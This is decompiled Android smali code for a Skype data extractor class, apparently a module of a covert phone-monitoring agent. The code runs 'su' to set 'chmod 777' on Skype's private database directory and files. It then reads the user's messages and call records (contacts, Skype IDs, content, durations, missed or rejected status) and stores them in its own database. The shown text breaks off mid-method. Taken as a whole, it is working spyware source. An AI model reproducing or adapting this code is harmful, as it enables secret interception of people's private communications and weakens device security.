.class public Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;
.super Ljava/lang/Object;
.source "SkypeExtractorV8.java"


# static fields
.field protected static final TAG:Ljava/lang/String; = "SkypeExtractorV8"

.field protected static final TEMP_FILE_NAME_PREFIX:Ljava/lang/String; = "SkypeTmpFile"


# instance fields
.field protected context:Lcom/hp/vd/context/Context;

.field protected log:Lcom/hp/vd/agent/log/IWriter;

.field protected moduleData:Lcom/hp/vd/data/ModuleData;

.field protected skypeCallDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/SkypeCallData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected skypeMessageDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/SkypeMessageData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field


# direct methods
.method public constructor <init>(Lcom/hp/vd/context/Context;Lcom/j256/ormlite/dao/Dao;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/agent/log/IWriter;)V
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Lcom/hp/vd/context/Context;",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/SkypeMessageData;",
            "Ljava/lang/Integer;",
            ">;",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/SkypeCallData;",
            "Ljava/lang/Integer;",
            ">;",
            "Lcom/hp/vd/data/ModuleData;",
            "Lcom/hp/vd/agent/log/IWriter;",
            ")V"
        }
    .end annotation

    .line 58
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const/4 v0, 0x0

    .line 46
    iput-object v0, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->context:Lcom/hp/vd/context/Context;

    .line 47
    iput-object v0, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->skypeMessageDao:Lcom/j256/ormlite/dao/Dao;

    .line 48
    iput-object v0, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->skypeCallDao:Lcom/j256/ormlite/dao/Dao;

    .line 49
    iput-object v0, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 50
    iput-object v0, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->log:Lcom/hp/vd/agent/log/IWriter;

    .line 59
    iput-object p1, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->context:Lcom/hp/vd/context/Context;

    .line 60
    iput-object p2, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->skypeMessageDao:Lcom/j256/ormlite/dao/Dao;

    .line 61
    iput-object p3, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->skypeCallDao:Lcom/j256/ormlite/dao/Dao;

    .line 62
    iput-object p4, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 63
    iput-object p5, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->log:Lcom/hp/vd/agent/log/IWriter;

    return-void
.end method


# virtual methods
.method public chmod(Ljava/lang/String;Ljava/lang/Boolean;)Z
    .locals 5

    .line 594
    iget-object v0, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    const/4 v1, 0x0

    .line 597
    :try_start_0
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v2

    const-string v3, "su"

    invoke-virtual {v2, v3}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v2

    .line 599
    new-instance v3, Ljava/io/DataOutputStream;

    invoke-virtual {v2}, Ljava/lang/Process;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V

    .line 601
    invoke-virtual {p2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p2

    if-eqz p2, :cond_0

    .line 602
    new-instance p2, Ljava/lang/StringBuilder;

    invoke-direct {p2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "chmod -R 777 "

    invoke-virtual {p2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, "\n"

    invoke-virtual {p2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p2

    invoke-virtual {v3, p2}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    goto :goto_0

    .line 605
    :cond_0
    new-instance p2, Ljava/lang/StringBuilder;

    invoke-direct {p2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "chmod 777 "

    invoke-virtual {p2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, "\n"

    invoke-virtual {p2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p2

    invoke-virtual {v3, p2}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 608
    :goto_0
    invoke-virtual {v3}, Ljava/io/DataOutputStream;->flush()V

    const-string p2, "exit\n"

    .line 610
    invoke-virtual {v3, p2}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 611
    invoke-virtual {v3}, Ljava/io/DataOutputStream;->flush()V

    .line 613
    invoke-virtual {v2}, Ljava/lang/Process;->waitFor()I

    const-string p2, "SkypeExtractorV8"

    .line 615
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "Chroot successful: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-interface {v0, p2, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    const/4 p1, 0x1

    return p1

    :catch_0
    move-exception p1

    const-string p2, "SkypeExtractorV8"

    const-string v2, "chmod(path): InterruptedException caught during chmod."

    .line 625
    invoke-interface {v0, p2, v2, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return v1

    :catch_1
    move-exception p1

    const-string p2, "SkypeExtractorV8"

    const-string v2, "chmod(path): IOException caught during chmod."

    .line 620
    invoke-interface {v0, p2, v2, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return v1
.end method

.method protected cleanTempFilesFromPreviousInvocations(Ljava/lang/String;)V
    .locals 3

    .line 634
    :try_start_0
    new-instance v0, Ljava/io/File;

    iget-object v1, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-virtual {v1}, Landroid/content/Context;->getCacheDir()Ljava/io/File;

    move-result-object v1

    invoke-virtual {v1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 635
    new-instance v1, Lcom/hp/vd/module/custom/skype/StartsWithFilenameFilter;

    invoke-direct {v1, p1}, Lcom/hp/vd/module/custom/skype/StartsWithFilenameFilter;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Ljava/io/File;->listFiles(Ljava/io/FilenameFilter;)[Ljava/io/File;

    move-result-object p1

    .line 637
    array-length v0, p1

    const/4 v1, 0x0

    :goto_0
    if-ge v1, v0, :cond_0

    aget-object v2, p1, v1

    .line 638
    invoke-virtual {v2}, Ljava/io/File;->delete()Z
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    :catch_0
    move-exception p1

    .line 642
    iget-object v0, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "SkypeExtractorV8"

    const-string v2, "Throwable caught while deleting temp files from previous invocation at"

    invoke-interface {v0, v1, v2, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    :cond_0
    return-void
.end method

.method protected constructIdentifier(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 1

    .line 506
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p1, "_"

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    return-object p1
.end method

.method public copy(Ljava/io/File;Ljava/io/File;)V
    .locals 7
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/io/IOException;
        }
    .end annotation

    .line 573
    new-instance v0, Ljava/io/FileInputStream;

    invoke-direct {v0, p1}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    .line 574
    new-instance p1, Ljava/io/FileOutputStream;

    invoke-direct {p1, p2}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    .line 576
    invoke-virtual {v0}, Ljava/io/FileInputStream;->getChannel()Ljava/nio/channels/FileChannel;

    move-result-object v1

    .line 577
    invoke-virtual {p1}, Ljava/io/FileOutputStream;->getChannel()Ljava/nio/channels/FileChannel;

    move-result-object v6

    .line 579
    invoke-virtual {v1}, Ljava/nio/channels/FileChannel;->size()J

    move-result-wide v4

    const-wide/16 v2, 0x0

    invoke-virtual/range {v1 .. v6}, Ljava/nio/channels/FileChannel;->transferTo(JJLjava/nio/channels/WritableByteChannel;)J

    .line 581
    invoke-virtual {v0}, Ljava/io/FileInputStream;->close()V

    .line 582
    invoke-virtual {p1}, Ljava/io/FileOutputStream;->close()V

    return-void
.end method

.method protected detectDatabaseFiles()Ljava/util/List;
    .locals 8
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()",
            "Ljava/util/List<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation

    .line 540
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    const-string v1, "/data/data/com.skype.raider/databases/"

    .line 543
    invoke-virtual {p0, v1}, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->isReadable(Ljava/lang/String;)Z

    move-result v2

    const/4 v3, 0x0

    if-nez v2, :cond_0

    .line 544
    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    invoke-virtual {p0, v1, v2}, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->chmod(Ljava/lang/String;Ljava/lang/Boolean;)Z

    .line 548
    :cond_0
    new-instance v2, Ljava/io/File;

    invoke-direct {v2, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 550
    new-instance v1, Lcom/hp/vd/module/custom/skype/StartsAndEndsWithFilenameFilter;

    const-string v4, "s4l-live:"

    const-string v5, ".db"

    invoke-direct {v1, v4, v5}, Lcom/hp/vd/module/custom/skype/StartsAndEndsWithFilenameFilter;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v2, v1}, Ljava/io/File;->listFiles(Ljava/io/FilenameFilter;)[Ljava/io/File;

    move-result-object v1

    if-eqz v1, :cond_3

    .line 552
    array-length v2, v1

    if-lez v2, :cond_3

    .line 553
    array-length v2, v1

    move v4, v3

    :goto_0
    if-ge v4, v2, :cond_3

    aget-object v5, v1, v4

    .line 554
    invoke-virtual {v5}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v5

    .line 556
    invoke-virtual {p0, v5}, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->isReadable(Ljava/lang/String;)Z

    move-result v6

    if-nez v6, :cond_1

    .line 557
    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-virtual {p0, v5, v6}, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->chmod(Ljava/lang/String;Ljava/lang/Boolean;)Z

    .line 560
    :cond_1
    new-instance v6, Ljava/io/File;

    invoke-direct {v6, v5}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 562
    invoke-virtual {v6}, Ljava/io/File;->exists()Z

    move-result v7

    if-eqz v7, :cond_2

    invoke-virtual {v6}, Ljava/io/File;->isFile()Z

    move-result v6

    if-eqz v6, :cond_2

    .line 563
    invoke-interface {v0, v5}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    :cond_2
    add-int/lit8 v4, v4, 0x1

    goto :goto_0

    :cond_3
    return-object v0
.end method

.method protected extractDuration(Lorg/w3c/dom/Document;I)Ljava/lang/Integer;
    .locals 1

    const-string v0, "part"

    .line 415
    invoke-interface {p1, v0}, Lorg/w3c/dom/Document;->getElementsByTagName(Ljava/lang/String;)Lorg/w3c/dom/NodeList;

    move-result-object p1

    .line 416
    invoke-interface {p1, p2}, Lorg/w3c/dom/NodeList;->item(I)Lorg/w3c/dom/Node;

    move-result-object p1

    .line 418
    check-cast p1, Lorg/w3c/dom/Element;

    const-string p2, "duration"

    .line 420
    invoke-interface {p1, p2}, Lorg/w3c/dom/Element;->getElementsByTagName(Ljava/lang/String;)Lorg/w3c/dom/NodeList;

    move-result-object p1

    const/4 p2, 0x0

    .line 421
    invoke-interface {p1, p2}, Lorg/w3c/dom/NodeList;->item(I)Lorg/w3c/dom/Node;

    move-result-object p1

    if-eqz p1, :cond_0

    .line 424
    invoke-interface {p1}, Lorg/w3c/dom/Node;->getTextContent()Ljava/lang/String;

    move-result-object p1

    invoke-static {p1}, Ljava/lang/Double;->parseDouble(Ljava/lang/String;)D

    move-result-wide p1

    invoke-static {p1, p2}, Ljava/lang/Double;->valueOf(D)Ljava/lang/Double;

    move-result-object p1

    .line 426
    invoke-virtual {p1}, Ljava/lang/Double;->intValue()I

    move-result p1

    invoke-static {p1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object p1

    return-object p1

    :cond_0
    const/4 p1, 0x0

    return-object p1
.end method

.method protected extractMessagesAndCalls(Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;)V
    .locals 12

    const-wide/16 v0, 0x0

    .line 190
    invoke-static {v0, v1}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    .line 191
    invoke-static {v0, v1}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    .line 197
    iget-object v0, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v1, "v8_max_message_id"

    .line 199
    invoke-virtual {p0, v1, p2}, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->constructIdentifier(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 197
    invoke-virtual {p0, v0, v1}, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->safeExtractMaxId(Lcom/hp/vd/data/ModuleData;Ljava/lang/String;)Ljava/lang/Long;

    move-result-object v0

    :try_start_0
    const-string v1, "SELECT nsp_data, nsp_i_convidcreatedtime AS dt, CAST(substr(\"1\"||SUBSTR(nsp_i_convidcreatedtime, INSTR(nsp_i_convidcreatedtime, \"A10361.\") + 7)||\"0\", 0, 14) AS INT) AS dt_formatted FROM messagesv12 WHERE dt LIKE \"C8:%\" AND dt_formatted > ? ORDER BY dt ASC LIMIT ?"

    const/4 v2, 0x2

    .line 207
    new-array v2, v2, [Ljava/lang/String;

    .line 210
    invoke-virtual {v0}, Ljava/lang/Long;->toString()Ljava/lang/String;

    move-result-object v3

    const/4 v4, 0x0

    aput-object v3, v2, v4

    const-string v3, "750"

    const/4 v5, 0x1

    aput-object v3, v2, v5

    .line 207
    invoke-virtual {p1, v1, v2}, Landroid/database/sqlite/SQLiteDatabase;->rawQuery(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v1

    if-eqz v1, :cond_f

    .line 215
    invoke-interface {v1}, Landroid/database/Cursor;->getCount()I

    move-result v2
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_3

    if-nez v2, :cond_0

    goto/16 :goto_9

    :cond_0
    move-object v2, v0

    .line 221
    :goto_0
    :try_start_1
    invoke-interface {v1}, Landroid/database/Cursor;->moveToNext()Z

    move-result v3

    if-eqz v3, :cond_d

    const-string v3, "nsp_data"

    .line 222
    invoke-interface {v1, v3}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    invoke-interface {v1, v3}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v3

    const-string v6, "dt_formatted"

    .line 223
    invoke-interface {v1, v6}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v6

    invoke-interface {v1, v6}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v6

    invoke-static {v6, v7}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v6

    .line 232
    new-instance v7, Lorg/json/JSONObject;

    invoke-direct {v7, v3}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    const-string v3, "messagetype"

    .line 233
    invoke-virtual {v7, v3}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v8, "RichText"

    .line 235
    invoke-virtual {v3, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v8

    const/4 v9, -0x1

    if-nez v8, :cond_9

    const-string v8, "Text"

    invoke-virtual {v3, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v8

    if-eqz v8, :cond_1

    goto/16 :goto_5

    :cond_1
    const-string v8, "Event/Call"

    .line 262
    invoke-virtual {v3, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v8
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_2

    if-eqz v8, :cond_8

    .line 264
    :try_start_2
    new-instance v3, Lcom/hp/vd/data/SkypeCallData;

    invoke-direct {v3}, Lcom/hp/vd/data/SkypeCallData;-><init>()V

    .line 266
    iput-object p2, v3, Lcom/hp/vd/data/SkypeCallData;->profile:Ljava/lang/String;

    .line 267
    invoke-static {v9}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v8

    iput-object v8, v3, Lcom/hp/vd/data/SkypeCallData;->internalId:Ljava/lang/Integer;

    const-string v8, "content"

    .line 269
    invoke-virtual {v7, v8}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    .line 271
    invoke-static {}, Ljavax/xml/parsers/DocumentBuilderFactory;->newInstance()Ljavax/xml/parsers/DocumentBuilderFactory;

    move-result-object v9

    .line 272
    invoke-virtual {v9}, Ljavax/xml/parsers/DocumentBuilderFactory;->newDocumentBuilder()Ljavax/xml/parsers/DocumentBuilder;

    move-result-object v9

    .line 274
    new-instance v10, Lorg/xml/sax/InputSource;

    new-instance v11, Ljava/io/StringReader;

    invoke-direct {v11, v8}, Ljava/io/StringReader;-><init>(Ljava/lang/String;)V

    invoke-direct {v10, v11}, Lorg/xml/sax/InputSource;-><init>(Ljava/io/Reader;)V

    .line 275
    invoke-virtual {v9, v10}, Ljavax/xml/parsers/DocumentBuilder;->parse(Lorg/xml/sax/InputSource;)Lorg/w3c/dom/Document;

    move-result-object v8

    .line 276
    invoke-interface {v8}, Lorg/w3c/dom/Document;->getDocumentElement()Lorg/w3c/dom/Element;

    move-result-object v9

    invoke-interface {v9}, Lorg/w3c/dom/Element;->normalize()V

    const-string v9, "_isMyMessage"

    .line 278
    invoke-virtual {v7, v9}, Lorg/json/JSONObject;->getInt(Ljava/lang/String;)I

    move-result v7

    if-ne v7, v5, :cond_2

    .line 279
    sget-object v9, Lcom/hp/vd/module/custom/skype/ConstantsV8;->TYPE_OUTGOING:Ljava/lang/Integer;

    goto :goto_1

    :cond_2
    sget-object v9, Lcom/hp/vd/module/custom/skype/ConstantsV8;->TYPE_INCOMING:Ljava/lang/Integer;

    :goto_1
    iput-object v9, v3, Lcom/hp/vd/data/SkypeCallData;->type:Ljava/lang/Integer;

    .line 281
    invoke-virtual {p0, v8, v4}, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->extractName(Lorg/w3c/dom/Document;I)Ljava/lang/String;

    move-result-object v9

    iput-object v9, v3, Lcom/hp/vd/data/SkypeCallData;->fromDisplayName:Ljava/lang/String;

    if-ne v7, v5, :cond_3

    move-object v9, p2

    goto :goto_2

    .line 282
    :cond_3
    invoke-virtual {p0, v8, v5}, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->extractSkypeId(Lorg/w3c/dom/Document;I)Ljava/lang/String;

    move-result-object v9

    :goto_2
    iput-object v9, v3, Lcom/hp/vd/data/SkypeCallData;->fromSkypeId:Ljava/lang/String;

    .line 283
    invoke-virtual {p0, v8, v5}, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->extractName(Lorg/w3c/dom/Document;I)Ljava/lang/String;

    move-result-object v9

    iput-object v9, v3, Lcom/hp/vd/data/SkypeCallData;->toDisplayName:Ljava/lang/String;

    if-ne v7, v5, :cond_4

    .line 284
    invoke-virtual {p0, v8, v5}, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->extractSkypeId(Lorg/w3c/dom/Document;I)Ljava/lang/String;

    move-result-object v7

    goto :goto_3

    :cond_4
    move-object v7, p2

    :goto_3
    iput-object v7, v3, Lcom/hp/vd/data/SkypeCallData;->toSkypeId:Ljava/lang/String;

    .line 286
    invoke-virtual {p0, v8, v4}, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->extractDuration(Lorg/w3c/dom/Document;I)Ljava/lang/Integer;

    move-result-object v7

    iput-object v7, v3, Lcom/hp/vd/data/SkypeCallData;->duration:Ljava/lang/Integer;

    .line 288
    invoke-interface {v8}, Lorg/w3c/dom/Document;->getDocumentElement()Lorg/w3c/dom/Element;

    move-result-object v7

    const-string v9, "type"

    invoke-interface {v7, v9}, Lorg/w3c/dom/Element;->getAttribute(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    const-string v9, "ended"

    invoke-virtual {v7, v9}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v7

    if-eqz v7, :cond_5

    .line 290
    sget-object v7, Lcom/hp/vd/module/custom/skype/ConstantsV8;->STATUS_ACCEPTED:Ljava/lang/Integer;

    iput-object v7, v3, Lcom/hp/vd/data/SkypeCallData;->status:Ljava/lang/Integer;

    .line 292
    :cond_5
    invoke-interface {v8}, Lorg/w3c/dom/Document;->getDocumentElement()Lorg/w3c/dom/Element;

    move-result-object v7

    const-string v8, "type"

    invoke-interface {v7, v8}, Lorg/w3c/dom/Element;->getAttribute(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    const-string v8, "missed"

    invoke-virtual {v7, v8}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v7

    if-eqz v7, :cond_7

    .line 298
    iget-object v7, v3, Lcom/hp/vd/data/SkypeCallData;->duration:Ljava/lang/Integer;

    if-eqz v7, :cond_6

    .line 299
    sget-object v7, Lcom/hp/vd/module/custom/skype/ConstantsV8;->STATUS_REJECTED:Ljava/lang/Integer;

    iput-object v7, v3, Lcom/hp/vd/data/SkypeCallData;->status:Ljava/lang/Integer;

    goto :goto_4

    .line 302
    :cond_6
    sget-object v7, Lcom/hp/vd/module/custom/skype/ConstantsV8;->STATUS_MISSED:Ljava/lang/Integer;

    iput-object v7, v3, Lcom/hp/vd/data/SkypeCallData;->status:Ljava/lang/Integer;

    .line 306
    :cond_7
    :goto_4
    new-instance v7, Ljava/sql/Date;

    invoke-virtual {v6}, Ljava/lang/Long;->longValue()J

    move-result-wide v8

    invoke-direct {v7, v8, v9}, Ljava/sql/Date;-><init>(J)V

    iput-object v7, v3, Lcom/hp/vd/data/SkypeCallData;->createdAt:Ljava/util/Date;

    .line 308
    iget-object v7, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->skypeCallDao:Lcom/j256/ormlite/dao/Dao;

    invoke-interface {v7, v3}, Lcom/j256/ormlite/dao/Dao;->create(Ljava/lang/Object;)I
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0
    .catch Ljava/lang/Throwable; {:try_start_2 .. :try_end_2} :catch_2

    goto/16 :goto_8

    :catch_0
    move-exception v3

    .line 311
    :try_start_3
    iget-object v6, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v7, "SkypeExtractorV8"

    const-string v8, "extractMessagesAndCalls(): Exception caught while extracting a particular Call"

    invoke-interface {v6, v7, v8, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    goto/16 :goto_0

    .line 318
    :cond_8
    iget-object v6, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v7, "SkypeExtractorV8"

    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    const-string v9, "Unsupported message type detected: "

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-interface {v6, v7, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z
    :try_end_3
    .catch Ljava/lang/Throwable; {:try_start_3 .. :try_end_3} :catch_2

    goto/16 :goto_0

    .line 237
    :cond_9
    :goto_5
    :try_start_4
    new-instance v3, Lcom/hp/vd/data/SkypeMessageData;

    invoke-direct {v3}, Lcom/hp/vd/data/SkypeMessageData;-><init>()V

    const-string v8, "_isMyMessage"

    .line 239
    invoke-virtual {v7, v8}, Lorg/json/JSONObject;->getInt(Ljava/lang/String;)I

    move-result v8

    const-string v10, "conversationId"

    .line 240
    invoke-virtual {v7, v10}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    .line 242
    invoke-virtual {p0, p1, v10}, Lcom/hp/vd/module/custom/skype/SkypeExtractorV8;->getDisplayName(Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    .line 244
    iput-object p2, v3, Lcom/hp/vd/data/SkypeMessageData;->profile:Ljava/lang/String;

    .line 245
    invoke-static {v9}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v9

    iput-object v9, v3, Lcom/hp/vd/data/SkypeMessageData;->internalId:Ljava/lang/Integer;

    if-ne v8, v5, :cond_a

    move-object v10, p2

    .line 246
    :cond_a
    iput-object v10, v3, Lcom/hp/vd/data/SkypeMessageData;->author:Ljava/lang/String;

    if-ne v8, v5, :cond_b

    move-object v9, p2

    goto :goto_6

    :cond_b
    move-object v9, v11

    .line 248
    :goto_6
    iput-object v9, v3, Lcom/hp/vd/data/SkypeMessageData;->fromDisplayName:Ljava/lang/String;

    if-ne v8, v5, :cond_c

    goto :goto_7

    :cond_c
    move-object v11, p2

    .line 249
    :goto_7
    iput-object v11, v3, Lcom/hp/vd/data/SkypeMessageData;->participents:Ljava/lang/String;

    const-string v8, "content"

    .line 250
    invoke-virtual {v7, v8}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    iput-object v7, v3, Lcom/hp/vd/data/SkypeMessageData;->bodyXml:Ljava/lang/String;

    .line 251
    new-instance v7, Ljava/sql/Date;

